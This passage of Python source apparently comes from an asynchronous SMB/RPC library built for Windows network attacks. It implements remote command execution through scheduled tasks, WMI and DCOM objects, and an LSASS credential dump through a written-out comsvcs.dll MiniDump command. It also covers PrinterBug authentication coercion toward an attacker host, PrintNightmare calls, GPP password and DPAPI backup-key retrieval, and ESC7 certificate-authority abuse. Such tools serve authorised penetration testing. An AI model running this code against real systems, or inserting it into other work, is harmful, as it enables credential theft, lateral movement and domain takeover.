				temp_location = '%%windir%%\\temp\\%s' % (temp_file_name)

				if self.print_cb is not None:
					await self.print_cb('[%s] Temp file location: %s' % (self.connection.target.get_hostname_or_ip(), temp_location))

				#totally not from impacket
				command = '%s  >  %s 2>&1' % (command, temp_location)

				logger.debug('Command: %s' % command)
				if self.print_cb is not None:
					await self.print_cb('[%s] Registering new task and executing command...' % self.connection.target.get_hostname_or_ip())

				res, err = await rpc.run_commands([command])
				if err is not None:
					raise err
				
				if self.print_cb is not None:
					await self.print_cb('[%s] Task executed OK! Waiting for output file' % self.connection.target.get_hostname_or_ip())
				
				err = None
				for _ in range(10):
					logger.debug('Opening temp file. Path: %s' % temp_file_location)
					temp = SMBFile.from_remotepath(self.connection, temp_file_location)
					_, err = await temp.open(self.connection)
					if err is not None:
						await asyncio.sleep(result_wait_timeout)
						continue
					break
				else:
					raise err

				if self.print_cb is not None:
					await self.print_cb('[%s] Got output file, reading...' % self.connection.target.get_hostname_or_ip())
				async for data, err in temp.read_chunked():
					if err is not None:
						logger.debug('Temp file read failed!')
						raise err
					if data is None:
						break

					yield data, err
				
				logger.debug('Deleting temp file...')
				if self.print_cb is not None:
					await self.print_cb('[%s] Deleting temp file...' % self.connection.target.get_hostname_or_ip())
				_, err = await temp.delete()
				if err is not None:
					logger.debug('Failed to delete temp file!')
					if self.print_cb is not None:
						await self.print_cb('[%s] Failed to delete temp file!' % self.connection.target.get_hostname_or_ip())
				
				yield None, None

		except Exception as e:
			yield None, e

	async def tasks_delete(self, task_name:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			async with tschrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.delete_task(task_name)
		except Exception as e:
			return None, e

	
	async def task_dump_lsass(self, lsass_file_name:str = None, silent:bool = False) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			if lsass_file_name is None:
				lsass_file_name = os.urandom(4).hex() + '.arj'
			command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name

			logger.debug('Command: %s' % command)
			
			res, err = await self.tasks_execute_commands([command])
			if err is not None:
				raise err
			
			if silent is False:
				if self.print_cb is not None:
					await self.print_cb('[%s] Dumping task created on remote end, now waiting...' % self.connection.target.get_hostname_or_ip())
				else:
					logger.debug('Dumping task created on remote end, now waiting...')

			for _ in range(5):
				await asyncio.sleep(5)
				temp = SMBFile.from_remotepath(self.connection, '\\ADMIN$\\Temp\\%s' % lsass_file_name)
				_, err = await temp.open(self.connection)
				if err is not None:
					continue
				if silent is False:
					if self.print_cb is not None:
						await self.print_cb('[%s] Remote file location: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip() ,lsass_file_name))
					else:
						logger.debug('Remote file location resolved on remote host')
				return temp, None

			return None, err
		except Exception as e:
			return None, e

	async def printerbug(self, attacker_host:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		"""
		Creates a service and starts it.
		Does not create files! there is a separate command for that!
		"""
		try:
			async with rprnrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				if self.print_cb is not None:
					await self.print_cb('opening printer')
				else:
					logger.debug('opening printer')
				handle, err = await rpc.open_printer('\\\\%s\x00' % self.connection.target.get_hostname_or_ip())
				if err is not None:
					raise err
				resp, err = await rpc.hRpcRemoteFindFirstPrinterChangeNotificationEx(
					handle,
					PRINTER_CHANGE_ADD_JOB,
					pszLocalMachine = '\\\\%s\x00' % attacker_host,

				)
				if err is not None:
					raise err
				return True, None
		except Exception as e:
			return None, e
	
	
	async def enum_printer_drivers(self, environments:str = "Windows x64", level:int = 2, name:str = '') -> Awaitable[Tuple[List[str], Union[Exception, None]]]:
		try:
			async with rprnrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.enum_drivers(environments, level = level, name = name)
		except Exception as e:
			return None, e

	async def printnightmare(self, share:str, driverpath:str, environments:str = "Windows x64", silent:bool = False):
		try:
			async with rprnrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.printnightmare(share, driverpath = driverpath, environments = environments, silent = silent)
		except Exception as e:
			return None, e

	async def par_printnightmare(self, share:str, driverpath:str, environments:str = "Windows x64", silent:bool = False):
		try:
			async with parrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.printnightmare(share, driverpath = driverpath, environments = environments, silent = silent)
		except Exception as e:
			return None, e

	async def list_interfaces(self) -> Awaitable[Tuple[List[Dict[str, Union[int, str]]], Union[Exception, None]]]:
		try:
			interfaces = []
			ipc_file = SMBFile.from_uncpath('\\\\%s\\IPC$' % self.connection.target.get_hostname_or_ip())
			await ipc_file.open(self.connection, 'r')
			ifaces_raw, err = await self.connection.ioctl(ipc_file.tree_id, int.from_bytes(b'\xFF'*16, byteorder='little'), CtlCode.FSCTL_QUERY_NETWORK_INTERFACE_INFO, data = None, flags = IOCTLREQFlags.IS_FSCTL)
			if err is not None:
				raise err

			for iface_raw in ifaces_raw:
				t = {
					'index' : iface_raw.IfIndex,
					'cap' : iface_raw.Capability,
					'speed' : iface_raw.LinkSpeed,
					'address' : str(iface_raw.SockAddr_Storage.Addr),
				}
				interfaces.append(t)
			
			return interfaces, None


		except Exception as e:
			return None, e

		finally:
			await ipc_file.close()
	
	async def check_service_status(self, service_name:str) -> Awaitable[Tuple[ServiceStatus, Union[Exception, None]]]:
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.check_service_status(service_name)
		except Exception as e:
			return None, e
	
	async def get_service_sd(self, service_name:str) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		try:
			async with remsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.get_service_sd(service_name)
		except Exception as e:
			return None, e
	
	async def get_backupkeys(self) -> Awaitable[Tuple[Dict[str, bytes], Union[Exception, None]]]:
		try:
			async with lsadrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.get_backupkeys()
		except Exception as e:
			return None, e
	
	async def get_cpasswd(self, depth:int = 5):
		async for filename, username, cpassword, xmltype, err in find_cpasswd(self.connection, depth = depth):
			yield filename, username, cpassword, xmltype, err
		
	async def at_add_job(self, atinfo, server_name:str = None):
		try:
			async with atsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.add_job(atinfo, servername = server_name)
		except Exception as e:
			return None, e
	
	async def at_enum(self, server_name:str = None):
		try:
			async with atsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.enum_jobs(servername = server_name)
		except Exception as e:
			return None, e
	
	async def at_del_job(self, job_id:int, server_name:str = None):
		try:
			async with atsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.del_job(job_id, servername = server_name)
		except Exception as e:
			return None, e
	
	async def at_get_info(self, job_id:int, server_name:str = None):
		try:
			async with atsvcrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.get_job(job_id, servername = server_name)
		except Exception as e:
			return None, e
	
	async def share_write_test(self, fetch_share_sd:bool = False):
		try:
			async for share, err in self.list_shares(fetch_share_sd = fetch_share_sd):
				if err is not None:
					continue
				if share.name in ['IPC$', 'C$', 'ADMIN$', 'PRINT$', 'D$', 'E$', 'F$', 'G$', 'H$', 'I$', 'J$', 'K$', 'L$', 'M$', 'N$', 'O$', 'P$', 'Q$', 'R$', 'S$', 'T$', 'U$', 'V$', 'W$', 'X$', 'Y$', 'Z$']:
					yield share, False, None
					continue

				writeable = False
				test_path_dir = share.unc_path + '\\test_%s' % os.urandom(4).hex()
				test_path_file = share.unc_path + '\\test_file_%s' % os.urandom(4).hex()

				_, err = await SMBDirectory.create_remote(self.connection, test_path_dir)
				if err is None:
					writeable = True
					await SMBDirectory.delete_unc(self.connection, test_path_dir)
				
				if writeable is False:
					smbfile = SMBFile.from_uncpath(test_path_file)
					_, err = await smbfile.open(self.connection, mode='w')
					if err is None:
						writeable = True
						await smbfile.delete()

				yield share, writeable, None

		except Exception as e:
			yield None, None, e
	
	async def resolve_sid(self, sid:str):
		try:
			sid = str(sid)
			sidsplit = sid.split('-')
			dsid = '-'.join(sidsplit[:-1])
			urid = sidsplit[-1]

			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				dhandle, err = await samrpc.open_domain(dsid)
				if err is not None:
					raise err
				
				uhandle, err = await samrpc.open_user(dhandle, urid)
				if err is not None:
					if str(err).find('NO_SUCH_USER') != -1:
						dhandle, err = await samrpc.openBuiltinDomain()
						if err is not None:
							raise err
						uhandle, err = await samrpc.open_user(dhandle, urid)

					if err is not None:
						logger.debug('User open failed! %s' % err)
						raise err
				
				username, err = await samrpc.get_user_username(uhandle)
				if err is not None:
					raise err

				return username, None

		except Exception as e:
			return None, e
	
	async def whoami(self) -> Awaitable[Tuple[str, Union[Exception, None]]]:
		try:
			groups = []
			async with samrrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as samrpc:
				async with lsadrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as lsadrpc:
					policy_handle, err = await lsadrpc.open_policy2()
					if err is not None:
						raise err
					domain_sid, err = await lsadrpc.get_domain_sid(policy_handle)
					if err is not None:
						raise err
					
					username, err = await lsadrpc.get_username()
					if err is not None:
						raise err
					
					usersid, domainname, userrid, err = await lsadrpc.get_sid_for_user(policy_handle, username)
					if err is not None:
						raise err

					sdsid, err = await samrpc.get_domain_sid(domainname)
					if err is not None:
						raise err
					
					dhandle, err = await samrpc.open_domain(sdsid)
					if err is not None:
						raise err
					
					uhandle, err = await samrpc.open_user(dhandle, userrid)
					if err is not None:
						raise err
					
					async for x, err in samrpc.get_user_group_memberships(uhandle):
						if err is not None:
							raise err
						groups.append(x)

				return username, domainname, usersid, groups, None
		except Exception as e:
			return None, None, None, None, e
	
	async def reg_get_system_drive_letter(self):
		try:
			async with rrprpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				drive, err = await rpc.get_system_drive_letter()
				if err is not None:
					raise err
				return drive, None
		except Exception as e:
			return None, e

	async def reg_get_user_home_directory_base_path(self):
		try:
			async with rrprpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				user_home_directory_base_path, err = await rpc.get_user_home_directory_base_path()
				if err is not None:
					raise err
				return user_home_directory_base_path, None
		except Exception as e:
			return None, e

	async def reg_get_ntds_file_path(self):
		try:
			async with rrprpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				ntds_file_path, err = await rpc.get_ntds_file_path()
				if err is not None:
					raise err
				return ntds_file_path, None
		except Exception as e:
			return None, e

	
	async def reg_get_windows_directory_path(self):
		try:
			async with rrprpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				windows_directory_path, err = await rpc.get_windows_directory_path()
				if err is not None:
					raise err
				return windows_directory_path, None
		except Exception as e:
			return None, e
	
	async def wmi_query(self, query:str, as_dict:bool = True):
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
				if err is not None:
					raise err
				async with IWbemLevel1Login(iInterface) as iWbemLevel1Login:
					iWbemServices, err = await iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
					if err is not None:
						raise err
					async with iWbemServices:
						iEnum, err = await iWbemServices.ExecQuery(query)
						if err is not None:
							raise err
						async with iEnum:
							async for item in iEnum:
								if as_dict:
									yield item.to_dict(), None
								else:
									yield item, None
		except Exception as e:
			yield None, e

	async def wmi_shadowcopy_list(self):
		try:
			shadow_copies = []
			async for item, err in self.wmi_query('SELECT * FROM Win32_ShadowCopy', as_dict=False):
				if err is not None:
					raise err
				props = item.getProperties()
				install_date = props.get('InstallDate', {}).get('value', 'N/A')
				
				# Convert CIM_DATETIME to @GMT-YYYY.MM.DD-HH.MM.SS format
				gmt_label = None
				if install_date and install_date != 'N/A':
					try:
						# CIM_DATETIME format: yyyymmddHHMMSS.mmmmmm+UUU or yyyymmddHHMMSS.mmmmmm-UUU
						# Example: 20260201043823.374315-480
						dt_part = install_date[:14]  # yyyymmddHHMMSS
						tz_part = install_date[21:]   # +UUU or -UUU (offset in minutes)
						
						# Parse the datetime part
						dt = datetime.strptime(dt_part, '%Y%m%d%H%M%S')
						
						# Parse timezone offset and convert to UTC
						tz_offset_minutes = int(tz_part)
						dt_utc = dt - timedelta(minutes=tz_offset_minutes)
						
						# Format as @GMT-YYYY.MM.DD-HH.MM.SS
						gmt_label = dt_utc.strftime('@GMT-%Y.%m.%d-%H.%M.%S')
					except Exception:
						gmt_label = None
				
				shadow_copy = {
					'ID': props.get('ID', {}).get('value', 'N/A'),
					'DeviceObject': props.get('DeviceObject', {}).get('value', 'N/A'),
					'VolumeName': props.get('VolumeName', {}).get('value', 'N/A'),
					'InstallDate': install_date,
					'GMTLabel': gmt_label,
					'State': props.get('State', {}).get('value', 'N/A'),
				}
				shadow_copies.append(shadow_copy)
			return shadow_copies, None
		except Exception as e:
			return None, e
	
	async def wmi_shadowcopy_create(self, volume: str):
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
				if err is not None:
					raise err
				async with IWbemLevel1Login(iInterface) as iWbemLevel1Login:
					iWbemServices, err = await iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
					if err is not None:
						raise err
					async with iWbemServices:
						shadow_id, device_object, err = await wmi_create_shadow_copy(iWbemServices, volume)
						if err is not None:
							raise err
						return shadow_id, device_object, None
		except Exception as e:
			return None, None, e

	async def wmi_shadowcopy_delete(self, shadow_id: str):
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
				if err is not None:
					raise err
				async with IWbemLevel1Login(iInterface) as iWbemLevel1Login:
					iWbemServices, err = await iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
					if err is not None:
						raise err
					async with iWbemServices:
						deleted, err = await wmi_delete_shadow_copy(iWbemServices, shadow_id)
						if err is not None:
							raise err
						return deleted, None
		except Exception as e:
			return None, e

	
	async def wmi_cmd_exec(self, command:str) -> Awaitable[Tuple[int, int, Union[Exception, None]]]:
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)
				if err is not None:
					raise err
				async with IWbemLevel1Login(iInterface) as iWbemLevel1Login:
					iWbemServices, err = await iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
					if err is not None:
						raise err
					async with iWbemServices:
						return_value, process_id, err = await wmi_cmd_exec(iWbemServices, command)
						if err is not None:
							raise err
						return return_value, process_id, None
		except Exception as e:
			return None, None, e

	async def mmc20_cmd_exec(self, command:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			parts = command.split(' ', 1)
			exe = parts[0]
			args = parts[1] if len(parts) > 1 else ''
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_MMC20, IID_IDispatch)
				if err is not None:
					raise err
				async with MMC20Application(iInterface) as mmc:
					return_value, err = await mmc.ExecuteShellCommand(
						command=exe, 
						directory='C:\\Windows\\System32',
						parameters=args,
						windowState='0'
					)
					if err is not None:
						raise err
					return return_value, None
		except Exception as e:
			return None, e
	
	async def shellwindows_cmd_exec(self, command:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_ShellWindows, IID_IDispatch)
				if err is not None:
					raise err
				async with ShellWindows(iInterface) as shell:
					return await shell.ShellExecute(command)
		except Exception as e:
			return None, e
	
	async def shellbrowserwindow_cmd_exec(self, command:str) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_ShellBrowserWindow, IID_IDispatch)
				if err is not None:
					raise err
				async with ShellBrowserWindow(iInterface) as shell:
					return await shell.ShellExecute(command)
		except Exception as e:
			return None, e
	
	async def tasks_execute_command_as(self, run_as_sid:str, command:str, arguments:str = '', cleanup:bool = True) -> Awaitable[Tuple[bool, Union[Exception, None]]]:
		try:
			if run_as_sid.startswith('S-1-') is False:
				run_as_sid, domain_name, err = await self.resolve_username_to_sid(run_as_sid)
				if err is not None:
					raise err
				run_as_sid = str(run_as_sid)

			async with tschrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as rpc:
				return await rpc.run_command_as(run_as_sid, command, arguments=arguments, cleanup=cleanup)
		except Exception as e:
			return None, e
	
	async def resolve_username_to_sid(self, username:str) -> Awaitable[Tuple[str, str, Union[Exception, None]]]:
		"""
		Resolves a username to a SID using LSA LookupNames.
		This works for both local and domain users.
		
		The username can be in any of the following formats:
		- Just the username (e.g., "Administrator")
		- DOMAIN\\username (e.g., "MYDOMAIN\\Administrator")
		- username@domain (e.g., "Administrator@mydomain.local")
		
		Returns:
			Tuple of (sid, domain_name, error):
			- sid: The full SID string (e.g., "S-1-5-21-...")
			- domain_name: The domain or machine name the user belongs to
			- error: None on success, or an Exception on failure
		"""
		try:
			async with lsadrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as lsadrpc:
				policy_handle, err = await lsadrpc.open_policy2()
				if err is not None:
					raise err
				
				usersid, domain_name, user_rid, err = await lsadrpc.get_sid_for_user(policy_handle, username)
				if err is not None:
					raise err
				
				return usersid, domain_name, None
		except Exception as e:
			return None, None, e

	async def resolve_sid_to_username(self, sid:str) -> Awaitable[Tuple[str, str, Union[Exception, None]]]:
		"""
		Resolves a SID to a username using LSA LookupSids.
		This works for both local and domain users/groups.
		
		Args:
			sid: The SID string (e.g., "S-1-5-21-...")
		
		Returns:
			Tuple of (username, domain_name, error):
			- username: The account name
			- domain_name: The domain or machine name the account belongs to
			- error: None on success, or an Exception on failure
		"""
		try:
			async with lsadrpc_from_smb(self.connection, auth_level=self.force_rpc_auth) as lsadrpc:
				policy_handle, err = await lsadrpc.open_policy2()
				if err is not None:
					raise err
				
				async for domain_name, username, err in lsadrpc.lookup_sids(policy_handle, [sid]):
					if err is not None:
						raise err
					return username, domain_name, None
				
				# If we get here, no results were returned
				raise Exception('SID not found: %s' % sid)
		except Exception as e:
			return None, None, e

	async def get_ca_cert_dcom(self, ca_name: str, get_chain: bool = False) -> Tuple[bytes, Union[Exception, None]]:
		"""
		Retrieve a CA certificate via DCOM (ICertRequestD interface).
		
		Args:
			ca_name: CA name in format "hostname\\CA-Name" (e.g., "DC01\\MyCA")
			get_chain: If True, retrieve the full certificate chain (PKCS#7)
		
		Returns:
			(cert_bytes, None) on success - DER-encoded certificate
			(None, Exception) on failure
		"""
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_ICertRequest, IID_ICertRequestD)
				if err is not None:
					raise err
				async with ICertRequestD(iInterface) as cert_request:
					return await cert_request.get_ca_cert(ca_name, get_chain=get_chain)
		except Exception as e:
			return None, e

	async def get_ca_security_dcom(self, ca_name: str) -> Tuple[bytes, Union[Exception, None]]:
		"""
		Read a CA's authoritative security descriptor via DCOM (ICertAdminD2 GetCASecurity).

		Side-effect-free MS-CSRA read (opnum 36, no SetCASecurity/ACL mutation).
		Kerberos-native: the DCOM connection is opened off this SMB connection's
		GSSAPI context, so it reuses the connection's Kerberos ticket. Surfaces
		DELEGATED ManageCA / ManageCertificates holders (ESC7) that the CA object's
		LDAP nTSecurityDescriptor omits.

		Args:
			ca_name: CA name in format "hostname\\CA-Name" (e.g., "DC01\\MyCA")

		Returns:
			(sd_bytes, None) on success - raw self-relative security-descriptor bytes
			(None, Exception) on failure
		"""
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_ICertAdmin, IID_ICertAdminD2)
				if err is not None:
					raise err
				async with ICertAdminD2(iInterface) as cert_admin:
					sd_bytes = await cert_admin.get_ca_security(ca_name)
					return sd_bytes, None
		except Exception as e:
			return None, e

	async def set_ca_security_dcom(self, ca_name: str, sd_bytes: bytes) -> Tuple[int, Union[Exception, None]]:
		"""
		Write a CA's authoritative security descriptor via DCOM (ICertAdminD2 SetCASecurity).

		MS-CSRA write (opnum 37) used by ESC7 to grant/revoke ManageCA /
		ManageCertificates. Kerberos-native: the DCOM connection is opened off
		this SMB connection's GSSAPI context.

		Args:
			ca_name: CA name in format "hostname\\CA-Name" (e.g., "DC01\\MyCA")
			sd_bytes: The raw self-relative security-descriptor bytes to write.

		Returns:
			(error_code, None) on success — the CA's ErrorCode (0 = success)
			(None, Exception) on failure
		"""
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_ICertAdmin, IID_ICertAdminD2)
				if err is not None:
					raise err
				async with ICertAdminD2(iInterface) as cert_admin:
					error_code = await cert_admin.set_ca_security(ca_name, sd_bytes)
					return error_code, None
		except Exception as e:
			return None, e

	async def resubmit_cert_request_dcom(self, ca_name: str, request_id: int) -> Tuple[int, Union[Exception, None]]:
		"""
		Force-issue a pending/denied request via DCOM (ICertAdminD ResubmitRequest).

		MS-CSRA write (opnum 5, ICertAdminD) used by ESC7 to issue the SubCA
		request the CA held for approval. Requires the ManageCertificates
		(officer) right. Kerberos-native.

		Args:
			ca_name: CA name in format "hostname\\CA-Name" (e.g., "DC01\\MyCA")
			request_id: The pending request ID to resubmit.

		Returns:
			(disposition, None) on success — CR_DISP_* (3 = issued, 0 = incomplete)
			(None, Exception) on failure
		"""
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_ICertAdminD, IID_ICertAdminD)
				if err is not None:
					raise err
				async with ICertAdminD(iInterface) as cert_admin:
					disposition = await cert_admin.resubmit_request(ca_name, request_id)
					return disposition, None
		except Exception as e:
			return None, e

	async def request_certificate_dcom(
		self,
		ca_name: str,
		csr_der: bytes,
		attributes: List[str] = None
	) -> Tuple[Dict, Union[Exception, None]]:
		"""
		Submit a certificate request to a CA via DCOM (ICertRequestD interface).
		
		Args:
			ca_name: CA name in format "hostname\\CA-Name" (e.g., "DC01\\MyCA")
			csr_der: DER-encoded certificate signing request (CSR)
			attributes: List of request attributes (e.g., ['CertificateTemplate:User'])
		
		Returns:
			(result_dict, None) on success where result_dict contains:
				- 'request_id': The assigned request ID
				- 'disposition': Disposition code (CR_DISP_*)
				- 'disposition_name': Human-readable disposition
				- 'certificate': DER-encoded certificate (if issued)
				- 'certificate_chain': PKCS#7 certificate chain (if issued)
				- 'disposition_message': Error/status message
			(None, Exception) on failure
		"""
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_ICertRequest, IID_ICertRequestD)
				if err is not None:
					raise err
				async with ICertRequestD(iInterface) as cert_request:
					return await cert_request.request(ca_name, csr_der, attributes=attributes)
		except Exception as e:
			return None, e

	async def retrieve_certificate_dcom(
		self,
		ca_name: str,
		request_id: int
	) -> Tuple[Dict, Union[Exception, None]]:
		"""
		Retrieve a pending certificate by request ID via DCOM (ICertRequestD interface).
		
		Args:
			ca_name: CA name in format "hostname\\CA-Name" (e.g., "DC01\\MyCA")
			request_id: The request ID from a previous certificate submission
		
		Returns:
			(result_dict, None) on success where result_dict contains:
				- 'request_id': The request ID
				- 'disposition': Disposition code (CR_DISP_*)
				- 'disposition_name': Human-readable disposition
				- 'certificate': DER-encoded certificate (if issued)
				- 'certificate_chain': PKCS#7 certificate chain (if issued)
				- 'disposition_message': Error/status message
			(None, Exception) on failure
		"""
		try:
			async with DCOMConnection.from_smbconnection(self.connection) as dcom:
				iInterface, err = await dcom.CoCreateInstanceEx(CLSID_ICertRequest, IID_ICertRequestD)
				if err is not None:
					raise err
				async with ICertRequestD(iInterface) as cert_request:
					return await cert_request.retrieve(ca_name, request_id)
		except Exception as e:
			return None, e

	async def request_certificate_rpc(
		self,
		ca_name: str,
		csr_der: bytes,
		attributes: List[str] = None
	) -> Tuple[Dict, Union[Exception, None]]:
		"""
		Submit a certificate request to a CA via RPC (MS-ICPR).
		
		Note: This uses TCP/RPC directly to the CA, not SMB. The SMB connection
		is used to resolve the endpoint via the endpoint mapper.
		
		Args:
			ca_name: CA name (e.g., "MyCA" or "DC01\\MyCA")
			csr_der: DER-encoded certificate signing request (CSR)
			attributes: List of request attributes (e.g., ['CertificateTemplate:User'])
		
		Returns:
			(result_dict, None) on success where result_dict contains:
				- 'request_id': The assigned request ID
				- 'disposition': Disposition code
				- 'certificate': DER-encoded certificate (if issued)
				- 'certificate_chain': Certificate chain data (if issued)
				- 'disposition_message': Error/status message
			(None, Exception) on failure
		"""
		try:
			icprrpc, err = await ICPRRPC.from_smbconnection(self.connection)
			if err is not None:
				raise err
			async with icprrpc:
				return await icprrpc.request_certificate(ca_name, csr_der, attributes=attributes)
		except Exception as e:
			return None, e

	async def retrieve_certificate_rpc(
		self,
		ca_name: str,
		request_id: int
	) -> Tuple[Dict, Union[Exception, None]]:
		"""
		Retrieve a pending certificate by request ID via RPC (MS-ICPR).
		
		Note: This uses TCP/RPC directly to the CA, not SMB. The SMB connection
		is used to resolve the endpoint via the endpoint mapper.
		
		Args:
			ca_name: CA name (e.g., "MyCA" or "DC01\\MyCA")
			request_id: The request ID from a previous certificate submission
		
		Returns:
			(result_dict, None) on success where result_dict contains:
				- 'request_id': The request ID
				- 'disposition': Disposition code
				- 'certificate': DER-encoded certificate (if issued)
				- 'certificate_chain': Certificate chain data (if issued)
				- 'disposition_message': Error/status message
			(None, Exception) on failure
		"""
		try:
			icprrpc, err = await ICPRRPC.from_smbconnection(self.connection)
			if err is not None:
				raise err
			async with icprrpc:
				return await icprrpc.retrieve_certificate(ca_name, request_id)
		except Exception as e:
			return None, e

	async def iter_user_homes(self, include_system_accounts:bool = False):
		try:
			user_base_win, err = await self.reg_get_user_home_directory_base_path()
			if err is not None:
				raise err
			user_base_unc = user_base_win.replace(':\\', '$\\')
			user_base_unc = '\\%s' % user_base_unc

			# \\C$\\temp\\test.exe
			smbdir = SMBDirectory.from_remotepath(self.connection, user_base_unc)
			async for entry, entrytype, err in smbdir.list_r(self.connection, depth = 1, maxentries = -1):
				if err is not None:
					continue
				if entrytype == 'dir':
					yield entry, None
			
			if True: #if include_system_accounts is True:
				systemroot_win, err = await self.reg_get_windows_directory_path()
				if err is not None:
					raise err
				systemroot_unc = systemroot_win.replace(':\\', '$\\')
				user_base_paths_system = [
					'\\%s\\ServiceProfiles\\LocalService' % systemroot_unc,
					'\\%s\\ServiceProfiles\\NetworkService' % systemroot_unc,
					'\\%s\\system32\\config\\systemprofile' % systemroot_unc,
				]
				for path in user_base_paths_system:
					smbdir = SMBDirectory.from_remotepath(self.connection, path)
					yield smbdir, None
					
		except Exception as e:
			yield None, e